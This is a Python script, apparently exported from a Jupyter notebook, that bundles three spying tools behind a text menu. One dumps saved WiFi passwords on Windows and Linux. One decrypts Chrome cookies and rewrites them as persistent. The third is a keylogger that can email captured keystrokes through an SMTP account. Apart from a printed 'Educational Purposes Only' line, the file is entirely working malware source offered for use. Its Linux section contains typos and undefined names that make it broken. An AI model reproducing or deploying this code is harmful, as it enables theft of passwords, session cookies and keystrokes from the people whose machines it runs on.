#!/usr/bin/env python
# coding: utf-8

# In[3]:


# Imports from Retrieve WiFi Password Script
import subprocess
import os
import re
from collections import namedtuple
import configparser

# Imports from Extract Chrome Cookies Script
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome

# Imports from KeyLogger Script
import keyboard 
import smtplib
from threading import Timer 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import hashlib

###################################
# Retrieve WiFi Password Password #
###################################

def get_windows_saved_ssids(): # collect a list of saved ssids
    output = subprocess.check_output("netsh wlan show profiles").decode()
    ssids = []
    profiles = re.findall(r"All User Profile\s(.*)",output)
    for profile in profiles:
        ssid = profile.strip().strip(":").strip() #this removes spaces and colons from ssids
        ssids.append(ssid) # add the above stripped information to the list of ssids
    return ssids

def get_windows_saved_wifi_passwords(verbose=1):
    """Extract saved wifi passwords from windows machine
    Args:
        verbose (int,optional): printing saved profiles in real time. Defaults to 1.
    Returns:
        [list]: list of the extracted profiels which has the fields ["ssid", "cipher", "key"]
    """
    ssids = get_windows_saved_ssids()
    Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
    profiles = []
    for ssid in ssids:
        ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
        # the above line gets the ciphers
        ciphers = re.findall(r"Cipher\s(.*)", ssid_details) # remove spaces and colon
        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers]) # this gets the actual
        key = re.findall(r"Key Content\s(.*)", ssid_details)
        
        try:
            key = key[0].strip().strip(":").strip()
        except IndexError:
            key = "None"
        profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
        if verbose >= 1:
            print_windows_profile(profile)
        profiles.append(profile)
    return profiles

def print_windows_profile(profile): # prints a single profile on a window system
    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")
    
def print_windows_profiles(verbose): # print all f the ssids with keys on windows
    print("SSID                     CIPHER(S)             KEY")
    get_windows_saved_wifi_passwords(verbose)
    
def get_linux_saved_wifi_passwords(verbose=1):
        """Extracts wifi passwords from a linux system. This accesses data in '/etc/NetworkManager/system-connections/' directory
        Args:
            verbose(int,optional): option to print saved profiles in real-time. Defaults to 1.
        Returns:
            [list]: list of extracted profiles, a profile has the fields ["ssid", "auth-alg", "key-mgmt", "psk"]
        """
        network_connections_path = "/etc/NetworkManager/system-connections/"
        fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
        Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
        profiles = []
        for file in os.listdir(network_connections_path):
            date = {k.replace("-", "_"): None for k in fields}
            config = configparser.ConfigParser()
            config.read(os.path.join(network_connections_path, file))
            for _, section in config.items():
                for k, v in section.items():
                    if k in fields:
                        data[k.replace("-", "_")] = V
            profile = Profile(**data)
            if verbose >= 1:
                print_linux_profiles(profile)
            profiles.append(profile)
        return profiles
def print_linux_profiles(profile): # prints a single linux profile
    print(f"{str(profile.ssid):25}{str(rofile.auth_alg):5}{str(rofile.key_mgmt):10}{str(profile.psk):50}")
    
def print_linux_profiles(verbose=1): # prints all SSIDS and keys n psk
    print("SSID                    AUTH KEY-MGMT              PSK")
    get_linux_saved_wifi_passwords(verbose)

def print_profiles(verbose=1):
    if os.name == "nt":
        print_windows_profiles(verbose)
    elif os.name == "posix":
        print_linux_profiles(verbose)
    else:
        raise NotImplemented("This program only works on linux and windows")

##########################
# Extract Chrome Cookies #       
##########################

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove 'DPAPI' str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
def extract_cookies():
    # local sqlite Chrome cookie database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        print(f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================""")
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()

####################
# Keylogger Script #
####################

SEND_REPORT_EVERY = 90 # email send interval in seconds
EMAIL_ADDRESS = "email@dogpile.com"# email account you want to use
EMAIL_PASSWORD = "Hello world" # account pswd

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " " # quotations instead of space
            elif name == "enter":
                name = "[ENTER]\n" # add a new line when enter is pressed
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_") #replace any spaces with underscores
                name = f"[{name.upper()}]"
                #add key name to the self.log
            self.log += name
            
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
        # build filename identified by start and end times
        
    def report_to_file(self): #open file in write mode
        with open(f"{self.filename}.txt", "w") as f: # write the keystroke logs to the file
            print (self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        
    def prepare_mail(self, message): #creating the email
        msg = MIMEMultipart("alternative")
        msg["From"]= EMAIL_ADDRESS #from line in email window
        msg["To"] = EMAIL_ADDRESS # to line in email window
        msg["Subject"] = "Keylog" # message subject line
        html = f"<p>{message}</p>" # message paragraph for content
        text_part = MIMEText(message, "plain") #text and html content within the message
        html_part = MIMEText(html, "html")
        msg.attach(text_part) #attaching the text file version of the keylog
        msg.attach(html_part)# attaching the html version of the keylog
        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.live.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email,self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
            
    def report(self):
        if self.log: #if there is somethin gin the log then report it. 
            self.end_dt = datetime.now()# update the self.filename
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method =="file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log =""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self):
        self.start_dt = datetime.now() #record the start date and time
        keyboard.on_release(callback=self.callback) #start the keylogger
        self.report() #making the message
        print(f"{datetime.now()} - Started keylogger") #block the thread and wait for user input of CTRL C
        keyboard.wait()
              
def passwordCheck(): # Requests user for password and validates it
    userInput = input("Please enter a password: ").encode() # User enters a password and encodes it into bytes
    userInputHash = hashlib.sha3_256(userInput).hexdigest() # Converts userInput to a hash
    if(userInputHash == "5329091ef26383d2d686ee2afcc529eee90e47e3a4ef7cb2e1c4b7d0f20eb965"): # Compare hashes 
       return True
    else:
       return False
        
def run_keylogger():
    yayOrNay = passwordCheck() # Password check  
    if(yayOrNay == True):      # If Password is correct, runs Keylogger     
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()
    else: # If password is incorrect, sends a message
        print("The password you have entered is incorrect.\nGoodbye.")



################
# Main Program #
################

def main():
    
    print("Used for Educational Purposes Only.\n")
    print("Script allows user to:")
    print("     - Extract saved WiFi network and passwords from Windows/Linux System.")
    print("     - Extract Chrome cookies.")
    print("     - Install a Keylogger with log emailing capabilities.\n")
    
    print("Selection:")
    print("[0] = Exit Script")
    print("[1] = Extract WiFi network and passwords.")
    print("[2] = Extract Chrome cookies.")
    print("[3] = Install Keylogger.")
    print("[4] = Run all 3x scripts.")
    
    try:
        userInput = input("Enter a number for which script you would like to run: ")
        userInput = int(userInput) # Converts user input to Int from String


        if (userInput == 0): # Ends script
            print("\nGoodybe") 
        elif (userInput == 1): #Run Retrieve WiFi Password Script
            print()
            print_profiles() 
        elif (userInput == 2): # Run Extract Chrome Cookies Script
            print()
            extract_cookies() 
        elif (userInput == 3): # Run KeyLogger Script 
            print()
            run_keylogger() 
        elif (userInput == 4): # Runs all 3x scripts
            print("#"*50) # Spacer
            print_profiles()
            print("#"*50) # Spacer
            extract_cookies()
            print("#"*50) # Spacer
            run_keylogger()
        else:
            print("\nThe number you have entered is not an option.") # Ends script if user input outside selection range 0-4
            
    except: # Catchall exception for user input 
        print("\nAn error has occured.")
        print("The script will end.")

main()


# In[ ]:





# In[ ]:




